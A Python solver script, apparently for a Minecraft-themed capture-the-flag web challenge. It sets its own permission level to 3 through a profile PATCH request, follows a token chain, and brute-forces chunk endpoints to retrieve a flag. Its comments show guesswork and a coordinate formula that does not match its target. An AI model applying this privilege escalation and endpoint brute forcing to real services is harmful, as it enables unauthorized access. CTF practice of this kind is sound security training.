#!/usr/bin/env python3
import requests, json, base64

BASE = 'https://m1n3-cr4f7.onrender.com'
s = requests.Session()
s.get(BASE, timeout=30)
s.patch(BASE + '/api/v2/player/profile', json={'permission': 3},
        headers={'Accept': 'application/json'}, timeout=15)

def req(method, path, **kw):
    r = getattr(s, method)(BASE + path, timeout=15, **kw)
    try:
        return r.status_code, r.json()
    except:
        return r.status_code, r.text[:500]

# Setup chain
req('get', '/api/nether/chunk/1340/-255')
code, loot = req('get', '/loot/fortress_84')
book_meta = base64.b64decode(loot['loot'][3]['metadata']).decode()  # STRONGHOLD_84
code, sh = req('post', '/api/stronghold/activate', json={'identifier': book_meta})
eye_token = sh['enderEyeToken']
print(f'Token: {eye_token}')

# The fragments ordered by ascending elevation:
# Fragment_C (Sub-Bedrock Y=-64) = 84   -> 1st
# Fragment_A (Sea Level Y=63) = 73      -> 2nd
# Fragment_D (Cloud Line Y=192) = 26    -> 3rd
# Fragment_B (Build Limit Y=320) = 19   -> 4th
# Seed composite = 84, 73, 26, 19 -> 84732619
# Formula: X = ((84732619 % 50000) * 2) - 62678 = ((32619) * 2) - 62678 = 65238 - 62678 = 2560
# Z = -2040 -> chunk Z = -2040 // 16 = -127... but that was overworld

# Actually the challenge says Overworld rift at (10720, -2040)
# Deep Dark is in Overworld dimension, under Y=-51
# Chunk coords = block / 16
# 10720 / 16 = 670, -2040 / 16 = -127.5 => chunk (670, -128) or (670, -127)

# But also Fragment_C has value 84 = 0x54 hex, Sub-Bedrock
# "Chunk 0x84" - 0x84 = 132 decimal
# Maybe the deep dark chunk is literally (132, Z) where Z is something

# The server hint formula: X = ((Seed_Composite % 50000) * 2) - 62678 = 10720
# Seed_Composite in order: 84,73,26,19 => 84732619 
# 84732619 % 50000 = 32619, 32619 * 2 = 65238, 65238 - 62678 = 2560... doesn't match 10720
# Try reverse: (10720 + 62678) / 2 = 36699, 36699 % 50000 = 36699
# So Seed_Composite % 50000 = 36699 
# Try order: Fragment values in ascending elevation order: 84, 73, 26, 19
# Composite = str values: "84" + "73" + "26" + "19" = 84732619 - no
# Let me try: 84 * 1000000 + 73 * 10000 + 26 * 100 + 19 = 84732619

# For Deep Dark, the chunk where the ancient city is would be near the rift
# The rift at (10720, -2040) in overworld chunks = (670, -128)
# But that didn't work. Let's try ALL coords near that range

print('\nBrute force scanning deep dark near rift...')
found = False
for dx in range(-3, 4):
    for dz in range(-3, 4):
        x = 670 + dx
        z = -128 + dz
        code, data = req('get', f'/api/deepdark/chunk/{x}/{z}',
                         headers={'X-Ender-Eye': eye_token})
        if isinstance(data, dict) and data.get('artifact_endpoint'):
            print(f'FOUND ARTIFACT at ({x},{z})!')
            print(json.dumps(data, indent=2))
            found = True
            ep = data['artifact_endpoint']
            code2, art = req('get', ep, headers={'X-Ender-Eye': eye_token})
            print('Artifact:', json.dumps(art, indent=2))
            if isinstance(art, dict):
                if art.get('encoding') == 'base64' and art.get('data'):
                    print('DECODED:', base64.b64decode(art['data']).decode('utf-8', errors='replace'))
                if art.get('flag'):
                    print('FLAG:', art['flag'])
            break
        elif isinstance(data, dict) and data.get('sculk_sensor') == 'ACTIVE':
            print(f'  ACTIVE sensor at ({x},{z}): {json.dumps(data)[:200]}')
    if found:
        break

if not found:
    # Try coords derived from the seed
    print('\nTrying seed-derived coords...')
    # Fragment values in correct order: C=84, A=73, D=26, B=19
    # Various combinations
    candidates = [
        (84, -73), (-84, 73), (73, -84), (84, 73),
        (26, -19), (19, -26), (84, -26), (73, -19),
        (670, -127), (670, -129), (671, -128), (669, -128),
        (84, -84), (73, -26), (132, -128), (670, -255),
        (1340 // 8, -255 // 8),
        (10720 // 16, -2040 // 16),
        # Maybe it's just the fragment_C value as x and z
        (84, 84), (-84, -84), (0, -84),
    ]
    for x, z in candidates:
        code, data = req('get', f'/api/deepdark/chunk/{x}/{z}',
                         headers={'X-Ender-Eye': eye_token})
        if isinstance(data, dict) and data.get('artifact_endpoint'):
            print(f'FOUND! ({x},{z}): {json.dumps(data)[:300]}')
            ep = data['artifact_endpoint']
            code2, art = req('get', ep, headers={'X-Ender-Eye': eye_token})
            print('Artifact:', json.dumps(art, indent=2))
            if isinstance(art, dict):
                if art.get('encoding') == 'base64' and art.get('data'):
                    print('DECODED:', base64.b64decode(art['data']).decode('utf-8', errors='replace'))
                if art.get('flag'):
                    print('FLAG:', art['flag'])
            break
        elif isinstance(data, dict) and data.get('sculk_sensor') not in ['DORMANT', None]:
            print(f'  Interesting ({x},{z}): {json.dumps(data)[:200]}')
